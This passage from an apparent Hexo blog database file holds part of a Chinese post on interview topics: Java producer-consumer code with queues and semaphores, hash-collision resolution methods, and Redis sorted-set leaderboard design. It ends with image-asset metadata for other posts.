class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    blockingQueue.take();</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"信号量Semaphore的实现\"><a href=\"#信号量Semaphore的实现\" class=\"headerlink\" title=\"信号量Semaphore的实现\"></a>信号量Semaphore的实现</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test4</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">//创建三个信号量</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">Semaphore</span> <span class=\"variable\">mutex</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Semaphore</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test4</span> <span class=\"variable\">test4</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test4</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test4.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    notFull.acquire();</span><br><span class=\"line\">                    mutex.acquire();</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    mutex.release();</span><br><span class=\"line\">                    notEmpty.release();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e1) &#123;</span><br><span class=\"line\">                    e1.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    notEmpty.acquire();</span><br><span class=\"line\">                    mutex.acquire();</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                            + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                    mutex.release();</span><br><span class=\"line\">                    notFull.release();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"Java实现BlockQueue\"><a href=\"#Java实现BlockQueue\" class=\"headerlink\" title=\"Java实现BlockQueue\"></a>Java实现BlockQueue</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BlockingQueue</span>&lt;E&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 有界队列内部固定长度，因此可以用数组实现</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object[] elements;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 队列的头和尾下标</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> <span class=\"variable\">head</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>, tail = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 队列目前的长度</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> size;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">ReentrantLock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">notEmpty</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Condition</span> <span class=\"variable\">notFull</span> <span class=\"operator\">=</span> lock.newCondition();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BlockingQueue</span><span class=\"params\">(<span class=\"type\">int</span> capacity)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.elements = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[capacity];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">put</span><span class=\"params\">(E e)</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (size == elements.length)</span><br><span class=\"line\">                notFull.await();</span><br><span class=\"line\">            elements[tail] = e;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++tail == elements.length) &#123;</span><br><span class=\"line\">                tail = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">            notEmpty.signal();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> E <span class=\"title function_\">take</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"type\">E</span> <span class=\"variable\">e</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (size == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                notEmpty.await();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e = (E) elements[head];</span><br><span class=\"line\">            elements[head] = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (++head == elements.length)</span><br><span class=\"line\">                head = <span class=\"number\">0</span>;</span><br><span class=\"line\">            size--;</span><br><span class=\"line\">            notFull.signal();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> e;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">size</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        lock.lock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            lock.unlock();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解决哈希冲突的方法\"><a href=\"#解决哈希冲突的方法\" class=\"headerlink\" title=\"解决哈希冲突的方法\"></a>解决哈希冲突的方法</h2><h3 id=\"开放定址法\"><a href=\"#开放定址法\" class=\"headerlink\" title=\"开放定址法\"></a>开放定址法</h3><p>从发生冲突的那个单元起，按照一定的次序，从哈希表中找到一个空闲的单元。然后把发生冲突的元素存入到该单元的一种方法。开放定址法需要的表长度要大于等于所需要存放的元素。</p>\n<p>在开放定址法中解决冲突的方法有：线行探查法、平方探查法、双散列函数探查法。</p>\n<p>开放定址法的缺点在于删除元素的时候不能真的删除，否则会引起查找错误，只能做一个特殊标记。只到有下个元素插入才能真正删除该元素。</p>\n<h4 id=\"线行探查法\"><a href=\"#线行探查法\" class=\"headerlink\" title=\"线行探查法\"></a>线行探查法</h4><p>线行探查法是开放定址法中最简单的冲突处理方法，它从发生冲突的单元起，依次判断下一个单元是否为空，当达到最后一个单元时，再从表首依次判断。直到碰到空闲的单元或者探查完全部单元为止。</p>\n<p>可以参考csdn上flash对该方法的演示：<br><a href=\"http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf\">http://student.zjzk.cn/course_ware/data_structure/web/flash/cz/kfdzh.swf</a></p>\n<h4 id=\"平方探查法\"><a href=\"#平方探查法\" class=\"headerlink\" title=\"平方探查法\"></a>平方探查法</h4><p>平方探查法即是发生冲突时，用发生冲突的单元d[i], 加上 1²、 2²等。即d[i] + 1²，d[i] + 2², d[i] + 3²…直到找到空闲单元。</p>\n<p>在实际操作中，平方探查法不能探查到全部剩余的单元。不过在实际应用中，能探查到一半单元也就可以了。若探查到一半单元仍找不到一个空闲单元，表明此散列表太满，应该重新建立。</p>\n<h4 id=\"双散列函数探查法\"><a href=\"#双散列函数探查法\" class=\"headerlink\" title=\"双散列函数探查法\"></a>双散列函数探查法</h4><p>这种方法使用两个散列函数hl和h2。其中hl和前面的h一样，以关键字为自变量，产生一个0至m—l之间的数作为散列地址；h2也以关键字为自变量，产生一个l至m—1之间的、并和m互素的数(即m不能被该数整除)作为探查序列的地址增量(即步长)，探查序列的步长值是固定值l；对于平方探查法，探查序列的步长值是探查次数i的两倍减l；对于双散列函数探查法，其探查序列的步长值是同一关键字的另一散列函数的值。</p>\n<h3 id=\"链地址法（拉链法）\"><a href=\"#链地址法（拉链法）\" class=\"headerlink\" title=\"链地址法（拉链法）\"></a>链地址法（拉链法）</h3><p>链接地址法的思路是将哈希值相同的元素构成一个同义词的单链表，并将单链表的头指针存放在哈希表的第i个单元中，查找、插入和删除主要在同义词链表中进行。链表法适用于经常进行插入和删除的情况。</p>\n<p>如下一组数字,(32、40、36、53、16、46、71、27、42、24、49、64)哈希表长度为13，哈希函数为H(key)&#x3D;key%13,则链表法结果如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>       </span><br><span class=\"line\"><span class=\"number\">1</span>  -&gt; <span class=\"number\">40</span> -&gt; <span class=\"number\">27</span> -&gt; <span class=\"number\">53</span> </span><br><span class=\"line\"><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">3</span>  -&gt; <span class=\"number\">16</span> -&gt; <span class=\"number\">42</span></span><br><span class=\"line\"><span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">6</span>  -&gt; <span class=\"number\">32</span> -&gt; <span class=\"number\">71</span></span><br><span class=\"line\"><span class=\"number\">7</span>  -&gt; <span class=\"number\">46</span></span><br><span class=\"line\"><span class=\"number\">8</span></span><br><span class=\"line\"><span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">10</span> -&gt; <span class=\"number\">36</span> -&gt; <span class=\"number\">49</span></span><br><span class=\"line\"><span class=\"number\">11</span> -&gt; <span class=\"number\">24</span></span><br><span class=\"line\"><span class=\"number\">12</span> -&gt; <span class=\"number\">64</span></span><br></pre></td></tr></table></figure>\n<p>注：在java中，链接地址法也是HashMap解决哈希冲突的方法之一，jdk1.7完全采用单链表来存储同义词，jdk1.8则采用了一种混合模式，对于链表长度大于8的，会转换为红黑树存储。</p>\n<h3 id=\"再哈希法\"><a href=\"#再哈希法\" class=\"headerlink\" title=\"再哈希法\"></a>再哈希法</h3><p>就是同时构造多个不同的哈希函数：</p>\n<p>Hi &#x3D; RHi(key)   i&#x3D; 1,2,3 … k;</p>\n<p>当H1 &#x3D; RH1(key)  发生冲突时，再用H2 &#x3D; RH2(key) 进行计算，直到冲突不再产生，这种方法不易产生聚集，但是增加了计算时间。</p>\n<h3 id=\"建立公共溢出区\"><a href=\"#建立公共溢出区\" class=\"headerlink\" title=\"建立公共溢出区\"></a>建立公共溢出区</h3><p>将哈希表分为公共表和溢出表，当溢出发生时，将所有溢出数据统一放到溢出区。</p>\n<h2 id=\"排行榜设计\"><a href=\"#排行榜设计\" class=\"headerlink\" title=\"排行榜设计\"></a>排行榜设计</h2><h3 id=\"基于数据库\"><a href=\"#基于数据库\" class=\"headerlink\" title=\"基于数据库\"></a>基于数据库</h3><p>基于MySQL，order by</p>\n<p>缺点：</p>\n<ul>\n<li>速度慢</li>\n</ul>\n<h3 id=\"基于Redis\"><a href=\"#基于Redis\" class=\"headerlink\" title=\"基于Redis\"></a>基于Redis</h3><p>主要考察sort set 也就是zset</p>\n<p>zadd添加数据后，zrevrange获取排序后的排名</p>\n<h3 id=\"类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\"><a href=\"#类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\" class=\"headerlink\" title=\"类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样\"></a>类似于微信计数榜，如何设计不同用户看到的朋友圈的排行榜不一样</h3><p>key的设计比较重要，比如aa用户和bb用户</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd step:aa 1000 小明</span><br><span class=\"line\">zadd step:bb 1000 小明</span><br></pre></td></tr></table></figure>\n\n<p>同理时间也可以通过key的设计解决</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd step:aa:20210929 1000 小明</span><br><span class=\"line\">zadd step:aa:20210929 1000 小明</span><br></pre></td></tr></table></figure>\n\n<p>但是上述设计会导致每个用户都有一个排行榜，存储的数据巨大，其实可以考虑只在用户查询时通过好友关系去生成</p>\n<p>那朋友圈排行榜的：微信头像、点赞数 怎么获取呢</p>\n<ul>\n<li>可以使用hmset hash储存对象，需要时通过zset储存的key去查询即可</li>\n</ul>\n<h3 id=\"最近七天排行榜怎么弄\"><a href=\"#最近七天排行榜怎么弄\" class=\"headerlink\" title=\"最近七天排行榜怎么弄\"></a>最近七天排行榜怎么弄</h3><p>前面我们说的都是每日排行榜。</p>\n<p>假设面试官要求我们提供一个最近七天、上一周、上一月、上个季度、这一年排行榜啥的，又该怎么搞呢？</p>\n<p>其实这还是在考察你对于 Redis 有序集合 API 的掌握程度。</p>\n<p>也就是这个 API：</p>\n<ul>\n<li>zinterstore&#x2F;zunionstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max] 获取交集&#x2F;并集<ul>\n<li>zinterstore&#x2F;zunionstore其实就是交集&#x2F;并集</li>\n<li>destination 将交集&#x2F;并集的结果保存到这个键中</li>\n<li>numkeys 需要做交集&#x2F;并集的集合的个数</li>\n<li>key [key …] 具体参与交集&#x2F;并集的集合</li>\n<li>weights weight [weight …] 每个参与计算的集合的权重。在做交集&#x2F;并集计算时，每个集合中的 member 会把自己的 score 乘以这个权重，默认为 1。</li>\n<li>aggregate sum|min|max 对于各个集合中的相同元素是 sum(求和)、min(取最小值)还是max(取最大值)，默认为 sum。</li>\n</ul>\n</li>\n</ul>\n<p>比如现在有一些数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zadd sport:ranking:why:20210222 43243 why 2341 mx 8764 les 42321 skr</span><br><span class=\"line\">zadd sport:ranking:why:20210223 57632 why 24354 mx 4231 les 43512 skr 5341 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210224 10026 why 12344 mx 54312 les 34531 skr 43512 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210225 54312 why 32451 mx 23412 les 21341 skr 56321 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210226 3212 why 63421 mx 53652 les 45621 skr 5723 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210227 5462 why 10158 mx 30169 les 48858 skr 66079 jay</span><br><span class=\"line\">zadd sport:ranking:why:20210228 43553 why 4451 mx 7431 les 9563 skr 8232 jay</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/10.png\"></p>\n<p>现在我们要求出最近 7 天的排行榜，就用下面这行命令，命令有点复杂，但是对着命令格式看，还是很清晰的：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zunionstore sport:ranking:why:last_seven_day 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/11.png\"></p>\n<p>上面用的是并集，如果我们的要求是对最近 7 天，每天都上传运动数据的人进行排序，就用交集来算。</p>\n<p>命令和上面的一致，只是把 zunionstore 修改为 zinterstore 即可。</p>\n<p>另外为了有对比，合并之后的队列名称也修改一下，命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">zinterstore sport:ranking:why:last_seven_day_zinterstore 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum</span><br></pre></td></tr></table></figure>\n<p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/12.png\"></p>\n<p>知道最近 7 天的做法了，我们又有每一天数据，上一周、上一月、上个季度、这一年排行榜啥的不都是这个套路吗</p>\n<h3 id=\"亿级用户排行榜\"><a href=\"#亿级用户排行榜\" class=\"headerlink\" title=\"亿级用户排行榜\"></a>亿级用户排行榜</h3><h4 id=\"按段位分桶\"><a href=\"#按段位分桶\" class=\"headerlink\" title=\"按段位分桶\"></a>按段位分桶</h4><p>由于数据量比较大，所以需要类似于分成一个个小文件的思想去统计每一部分的数据</p>\n<p>比如游戏里的段位，统计国服前100，可以把王者、大师、砖石、铂金、黄金、白银、青铜 分为不同的桶，每个分段的人在不同的桶里(假设还是用zset存储用户的段位)<br>那计算全服排名即可先计算在某个段位桶的排名x,再获取这个段位桶前的所有桶的大小y1,y2…yn，排名就计算出来了x+y1+y2….yn</p>\n<h5 id=\"计算top100\"><a href=\"#计算top100\" class=\"headerlink\" title=\"计算top100\"></a>计算top100</h5><p>分桶后，直接在段位最大的桶里计算top100即可</p>\n<h4 id=\"按积分分桶\"><a href=\"#按积分分桶\" class=\"headerlink\" title=\"按积分分桶\"></a>按积分分桶</h4><p>[0-5000] [5001-10000] …..[10000000-x]</p>\n<p>这种可能会出现热点问题，比如处于0-5000区间的人会非常多（可能很多人都是没有打排位）用户的落点其实并不是均匀的，那就需要通过其他预测算法去预估每个区间的人数了</p>\n"}],"PostAsset":[{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\1.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"1.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\2.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"2.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\3.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"3.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\4.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"4.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\5.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"5.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\6.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"6.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\7.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"7.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Kali中优秀Wifi渗透工具前10\\8.png","post":"clylh1rxx0008bsuhet3x66b2","slug":"8.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\1.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"1.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\10.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"10.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\11.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"11.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\2.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"2.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\3.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"3.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\4.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"4.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\5.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"5.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\6.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"6.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\7.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"7.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\8.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"8.png","modified":1,"renderable":0},{"_id":"source\\_posts\\Edge浏览器中使用免费的ChatGPT\\9.png","post":"clylh1rxp0001bsuh6a7wh9wl","slug":"9.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\1.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"1.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\10.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"10.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\11.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"11.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\12.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"12.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\13.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"13.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\14.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"14.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\15.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"15.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\16.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"16.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\17.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"17.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\18.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"18.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\19.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"19.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\2.png","post":"clylh1rxw0007bsuh1nfh90ie","slug":"2.png","modified":1,"renderable":0},{"_id":"source\\_posts\\CPU打满怎么处理\\20.png","post":"cl